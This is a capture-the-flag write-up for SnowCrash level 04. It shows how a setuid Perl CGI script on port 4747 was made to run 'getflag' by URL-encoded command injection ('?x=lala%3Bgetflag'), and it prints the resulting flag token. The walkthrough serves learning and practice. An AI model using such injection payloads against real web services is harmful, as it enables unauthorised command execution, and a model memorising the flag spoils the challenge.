# SnowCrash Level 04

## Introduction
Welcome to SnowCrash Level 04! In this level, we embarked on a journey to explore and understand the environment in which the challenge is set.

## Initial Exploration
We began by inspecting the directory for potentially interesting files using commands like `find -iname` and `find -user`, along with the regular `ls` in the working directory. We discovered a Perl script named `level04.pl` and some other files located in `/rofs/var/www/level04` and `/var/www/level04`, indicating an Apache2 server running this Perl script on port 4747.

## Experimentation with Curl
Using `curl "http://192.168.56.102:4747/?x=lala"`, we observed that it simply printed "lala" in the terminal. However, when we attempted `curl "http://192.168.56.102:4747/?x=ls"`, it did not execute `ls`, indicating it was not the solution. We also tried to manipulate the script using malicious echoes, but the script had its own environment variables, ruling out that approach.

## Identification of Setuid and Setgid
Upon further inspection using `ls`, we noted:
```
-rwsr-sr-x 1 flag04 level04 152 Mar 5 2016 level04.pl
```
The script is running with the two 's' bits set, indicating it runs as flag04 and executes commands as flag04.

## Crafting the Exploit
We then attempted to use special characters like so: `curl "http://192.168.56.102:4747/?x=lala%3Bgetflag"`. Though it didn't work initially, we quickly replaced the semicolon with its URL code, `%3B`, and succeeded:

```bash
level04@SnowCrash:~$ curl "http://192.168.56.102:4747/?x=lala%3Bgetflag"
Check flag. Here is your token: ne2searoevaevoem4ov4ar8ap
